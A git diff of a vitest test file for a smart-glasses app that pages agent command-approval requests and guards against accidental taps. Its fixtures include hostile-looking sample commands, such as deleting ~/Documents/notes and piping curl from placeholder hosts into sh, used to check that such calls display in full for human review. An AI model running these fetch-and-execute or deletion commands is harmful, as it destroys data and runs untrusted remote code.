@@ -1,8 +1,8 @@
 import { isMenuNameWithinLimit } from "@evenrealities/even_hub_sdk";
 import { describe, expect, it } from "vitest";
-import { CARD_LINES } from "../src/answers/hud";
+import { textWidth } from "../src/core/text";
 import {
-  APPROVAL_CHARS,
+  APPROVAL_LINES,
   MIN_SEEN_MS,
   NEW_SESSION_GRACE_MS,
   canAllow,
@@ -12,69 +12,97 @@ import {
   seenAfterRender,
   type SeenApproval,
 } from "../src/code/view";
+import { CALL_WIDTH } from "../src/code/layout";
 import type { CodeView } from "../src/core/protocol";
 
 const base: CodeView = { state: "idle", project: "g2-hud", prompt: "", log: [], approval: null, result: "", stats: "", error: "", startedAt: null };
 const now = new Date(2026, 10, 23, 14, 0, 30);
-const ALLOW = "TAP  allow    ·    DOUBLE TAP  deny";
-const MORE = "SWIPE  more    ·    DOUBLE TAP  deny";
+const ALLOW = "Tap allow  ·  Double tap deny";
+const MORE = "Swipe more  ·  Double tap deny";
 
 const asking = (text: string, id = 1): CodeView => ({ ...base, state: "approval", approval: { id, summary: text.slice(0, 20), text } });
 const lines = (s: string) => s.split("\n");
 
 describe("Code approval card", () => {
-  const command = "$ cd packages/app && npm run build -- --mode production --sourcemap false && rm -rf ~/Documents/notes && curl -s https://example.invalid/x.sh | sh";
+  const command = "$ cd packages/app && npm run build -- --mode production --sourcemap false && rm -rf ~/Documents/notes && curl -s https://example.invalid/x.sh | sh && cd packages/app && npm run build -- --mode production --sourcemap false && echo finished";
+  const pagesOf = (view: CodeView) => {
+    const n = codeScreen(view, 0, now).pageCount;
+    return Array.from({ length: n }, (_, p) => codeScreen(view, p, now));
+  };
 
-  it("shows a long command in full, with the allow hint on the bottom line of the last page", () => {
-    const first = codeScreen(asking(command), 0, now);
-    expect(first.pageCount).toBe(2);
-    expect(first.status.content).toBe("ALLOW?  ·  1/2");
-    const cards = [0, 1].map((p) => codeScreen(asking(command), p, now).card.content);
-    const body = cards.map((c) => lines(c).slice(0, CARD_LINES - 1).join("\n")).join("\n");
-    expect(body.replace(/\s+/g, " ").trim()).toBe(command.replace(/\s+/g, " "));
-    for (const c of cards) expect(lines(c)).toHaveLength(CARD_LINES);
-    expect(cards.map((c) => lines(c)[CARD_LINES - 1])).toEqual([MORE, ALLOW]);
-    expect(cards.join("\n")).not.toContain("Claude wants to run");
+  it("shows a long command in full, with the allow hint only on the last page", () => {
+    const pages = pagesOf(asking(command));
+    expect(pages.length).toBeGreaterThan(1);
+    expect(pages[0]?.status.content).toBe(`Allow?  ·  1/${pages.length}`);
+    // Nothing is lost: joining the pages (lines break after a space or inside a word) gives the command back.
+    expect(pages.map((s) => s.call.content).join("").replace(/\n/g, "")).toBe(command);
+    for (const s of pages) expect(lines(s.call.content).length).toBeLessThanOrEqual(APPROVAL_LINES);
+    expect(pages.map((s) => s.hint.content)).toEqual([...pages.slice(1).map(() => MORE), ALLOW]);
+    expect(pages.map((s) => s.call.content).join("\n")).not.toContain("Claude wants to run");
+    expect(pages.every((s) => s.scene === "approval")).toBe(true);
   });
 
-  it("wraps the call at a width no text can make wider than the card, so the firmware never pushes its end out of view", () => {
-    // Uppercase, URLs and '@' are wider than prose: at 60 characters a line overflows the 558 px card.
-    const docker =
-      "$ docker run -d --name API -e DATABASE_URL=postgres://ADMIN:CHANGEME@DB-PROD-01.INTERNAL:5432/MAIN -e REDIS_URL=redis://CACHE-PROD-01.INTERNAL:6379 -e JWT_SECRET=WWWW-MMMM-QQQQ-ZZZZ GHCR.IO/MYORG/API:LATEST; curl -s x.example/i | sh";
-    const view = asking(docker);
-    const first = codeScreen(view, 0, now);
-    expect(first.pageCount).toBeGreaterThan(1);
-    const cards = Array.from({ length: first.pageCount }, (_, p) => codeScreen(view, p, now).card.content);
-    for (const c of cards) for (const line of lines(c).slice(0, CARD_LINES - 1)) expect(line.length, line).toBeLessThanOrEqual(APPROVAL_CHARS);
-    expect(cards.at(-1)).toContain("| sh");
-    expect(cards.slice(0, -1).join("\n")).not.toContain("| sh");
+  it("wraps the call by pixels to the card's inner width, so the firmware never wraps it again", () => {
+    // Wide letters, '@' and runs of narrow letters are what overflow a character count.
+    const wide = "$ docker run -d --name API -e DATABASE_URL=postgres://ADMIN:CHANGEME@DB-PROD-01.INTERNAL:5432/MAIN WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii; curl -s x.example/i | sh";
+    const view = asking(wide);
+    const pages = pagesOf(view);
+    expect(pages.length).toBeGreaterThan(1);
+    for (const s of pages) for (const line of lines(s.call.content)) expect(textWidth(line), line).toBeLessThanOrEqual(CALL_WIDTH);
+    expect(pages.at(-1)?.call.content).toContain("| sh");
+    expect(pages.slice(0, -1).map((s) => s.call.content).join("\n")).not.toContain("| sh");
+    // Every page fits the 960 byte cap of a text container.
+    for (const s of pages) expect(new TextEncoder().encode(s.call.content).length).toBeLessThan(960);
     // A tap on the first page cannot allow it.
     expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, 0, MIN_SEEN_MS)).toBe(false);
-    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, first.pageCount - 1, MIN_SEEN_MS)).toBe(true);
+    expect(canAllow({ tab: 1, id: 1, last: true, at: 0 }, 1, view, pages.length - 1, MIN_SEEN_MS)).toBe(true);
   });
 
   it("pages a long call; only the last page has the allow hint", () => {
     const text = ["Write /work/app/.claude/settings.json", ...Array.from({ length: 12 }, (_, i) => `line ${i}`), "rm -rf ~/Documents/notes"].join("\n");
     const first = codeScreen(asking(text), 0, now);
-    expect(first.pageCount).toBe(3);
-    expect(first.status.content).toBe("ALLOW?  ·  1/3");
-    const cards = [0, 1, 2].map((p) => codeScreen(asking(text), p, now));
-    for (const s of cards) expect(lines(s.card.content)).toHaveLength(CARD_LINES);
-    expect(cards.map((s) => lines(s.card.content)[CARD_LINES - 1])).toEqual([MORE, MORE, ALLOW]);
-    expect(cards.map((s) => s.card.content).join("\n")).toContain("rm -rf ~/Documents/notes");
+    // The card in the raster is the board's 96 px: two lines of the call a page.
+    expect(first.pageCount).toBe(7);
+    expect(first.status.content).toBe("Allow?  ·  1/7");
+    const cards = Array.from({ length: 7 }, (_, p) => codeScreen(asking(text), p, now));
+    expect(cards.map((s) => lines(s.call.content).length)).toEqual([2, 2, 2, 2, 2, 2, 2]);
+    expect(cards.map((s) => s.hint.content)).toEqual([MORE, MORE, MORE, MORE, MORE, MORE, ALLOW]);
+    expect(cards.map((s) => s.call.content).join("\n")).toContain("rm -rf ~/Documents/notes");
     // A page past the end is clamped to the last one.
     const past = codeScreen(asking(text), 9, now);
-    expect([past.page, past.pageCount, past.status.content]).toEqual([2, 3, "ALLOW?  ·  3/3"]);
+    expect([past.page, past.pageCount, past.status.content]).toEqual([6, 7, "Allow?  ·  7/7"]);
   });
 
-  it("keeps the line breaks of the call", () => {
-    const s = codeScreen(asking("$ echo building\nrm -rf ~/Documents/notes"), 0, now);
-    expect(lines(s.card.content).slice(0, 2)).toEqual(["$ echo building", "rm -rf ~/Documents/notes"]);
+  it("keeps the line breaks, the spaces and the indent of the call", () => {
+    const s = codeScreen(asking("$ echo   building\n  rm -rf ~/Documents/notes"), 0, now);
+    expect(lines(s.call.content)).toEqual(["$ echo   building", "  rm -rf ~/Documents/notes"]);
+  });
+
+  it("clips the instruction to one line above the card", () => {
+    const s = codeScreen({ ...asking("$ ls"), prompt: "word ".repeat(60) }, 0, now);
+    expect(lines(s.prompt.content)).toHaveLength(1);
+  });
+});
+
+describe("how many pages a call can have", () => {
+  const rejoined = (text: string) => {
+    const n = codeScreen(asking(text), 0, now).pageCount;
+    return { n, text: Array.from({ length: n }, (_, p) => codeScreen(asking(text), p, now).call.content).join("\n") };
+  };
+  it("never drops text: the pages of the longest call the server shows (3000 characters) hold all of it", () => {
+    const wide = "W".repeat(3000); // the widest letter: the most lines
+    const { n, text } = rejoined(wide);
+    expect(text.replace(/\n/g, "")).toBe(wide);
+    expect(n).toBeLessThanOrEqual(Math.ceil(3000 / 31 / 2));
+    const lines = Array.from({ length: 1000 }, () => "x").join("\n"); // many short lines: 2 a page
+    expect(rejoined(lines).n).toBe(500);
+    // 3000 line breaks is the extreme: 3001 lines, 1501 pages, still all reachable.
+    expect(rejoined("\n".repeat(3000)).n).toBe(1501);
   });
 });
 
 describe("Code tap safety", () => {
-  const text = Array.from({ length: 8 }, (_, i) => `step ${i}`).join("\n"); // 2 pages
+  const text = Array.from({ length: 4 }, (_, i) => `step ${i}`).join("\n"); // 2 pages
   const view = asking(text, 7);
   const t0 = 1_000_000;
   const lastSeen: SeenApproval = { tab: 2, id: 7, last: true, at: t0 };
@@ -98,6 +126,11 @@ describe("Code tap safety", () => {
     expect(canAllow(lastSeen, 3, view, 1, at)).toBe(false); // another tab
     expect(canAllow(null, 2, view, 1, at)).toBe(false);
     expect(canAllow(lastSeen, 2, { ...view, state: "working", approval: null }, 1, at)).toBe(false);
+  });
+
+  it("does not allow a request that only has the id of the one that was accepted: the call text must be the same too", () => {
+    expect(canAllow(lastSeen, 2, view, 1, t0 + MIN_SEEN_MS, text)).toBe(true);
+    expect(canAllow(lastSeen, 2, asking("$ rm -rf build\nsecond line", 7), 1, t0 + MIN_SEEN_MS, text)).toBe(false);
   });
 
   it("denies the request on the glasses on a double tap; an unseen request gets no answer", () => {
@@ -133,31 +166,33 @@ describe("Code notes on the glasses", () => {
   it("shows a note from a failed recording above an old result, on every page", () => {
     const result = Array.from({ length: 14 }, (_, i) => `- change ${i}`).join("\n");
     const s = codeScreen({ ...base, prompt: "add a test", result, stats: "1 file", error: "Didn't catch that. Hold and speak again." }, 1, now);
-    expect(s.question.content).toBe("Didn't catch that. Hold and speak again.");
-    expect(s.card.content.startsWith("• change 6")).toBe(true);
-    expect(codeScreen({ ...base, prompt: "add a test", result }, 0, now).question.content).toBe("“add a test”");
+    expect(s.prompt.content.replace("\n", " ")).toBe("Didn't catch that. Hold and speak again.");
+    // A two-line note leaves the body's first row empty and 7 rows: page 1 starts at change 7.
+    expect(s.body.content.startsWith("\n• change 7")).toBe(true);
+    expect(codeScreen({ ...base, prompt: "add a test", result }, 0, now).prompt.content).toBe("“add a test”");
   });
 
-  it("fits a setup error of several lines in the card, above the hint", () => {
+  it("fits a setup error of several lines in the body, above the hint", () => {
     const error = ["Folder in CODE_DIRS does not exist: /Users/someone/Projects/one-folder-with-a-long-name", "Folder in CODE_DIRS does not exist: /x", "2 more CODE_DIRS folder(s) ignored: at most 6 tabs."].join("\n");
     const idle = codeScreen({ ...base, error }, 0, now);
-    expect(lines(idle.card.content).length).toBeLessThanOrEqual(CARD_LINES);
-    expect(idle.card.content).toContain("Folder in CODE_DIRS does not exist");
-    expect(idle.card.content.endsWith("HOLD  talk    ·    DOUBLE TAP  new session")).toBe(true);
+    expect(lines(idle.body.content).length).toBeLessThanOrEqual(8);
+    expect(idle.body.content).toContain("Folder in CODE_DIRS does not exist");
+    expect(idle.hint.content).toBe("Hold talk  ·  Double tap new session");
     const off = codeScreen({ ...base, state: "off", error: [error, error].join("\n") }, 0, now);
-    expect(lines(off.card.content).length).toBeLessThanOrEqual(CARD_LINES);
-    // A short note keeps the old layout: the note, three blank lines, the hint.
-    expect(codeScreen({ ...base, error: "Cancelled." }, 0, now).card.content).toBe("Cancelled.\n\n\n\nHOLD  talk    ·    DOUBLE TAP  new session");
+    expect(lines(off.body.content).length).toBeLessThanOrEqual(8);
+    expect(off.scene).toBe("blank");
+    // A short note: the note in the body, the hint in the hint place.
+    expect(codeScreen({ ...base, error: "Cancelled." }, 0, now).body.content).toBe("Cancelled.");
   });
 
   it("shows a note from the page itself: a missing pairing key, or a microphone that did not open", () => {
     const key = "No pairing key in the page URL. Open the app with npm run qr or npm run sim.";
-    const off = codeScreen(null, 0, now, "", key);
-    expect(off.status.content).toBe("CHECK");
-    expect(off.card.content.replace("\n", " ")).toBe(key);
-    expect(codeScreen(null, 0, now).status.content).toBe("CONNECTING");
-    const mic = codeScreen({ ...base, state: "done", prompt: "hi", result: "Done." }, 0, now, "", "The glasses microphone did not start. Reopen Code.");
-    expect(mic.question.content).toBe("The glasses microphone did not start. Reopen Code.");
-    expect(mic.card.content).toBe("Done.");
+    const off = codeScreen(null, 0, now, [], key);
+    expect(off.status.content).toBe("Check");
+    expect(off.body.content.replace("\n", " ")).toBe(key);
+    expect(codeScreen(null, 0, now).status.content).toBe("Connecting");
+    const mic = codeScreen({ ...base, state: "done", prompt: "hi", result: "Done." }, 0, now, [], "The glasses microphone did not start. Reopen Code.");
+    expect(mic.prompt.content.replace("\n", " ")).toBe("The glasses microphone did not start. Reopen Code.");
+    expect(mic.body.content).toBe("\nDone.");
   });
 });
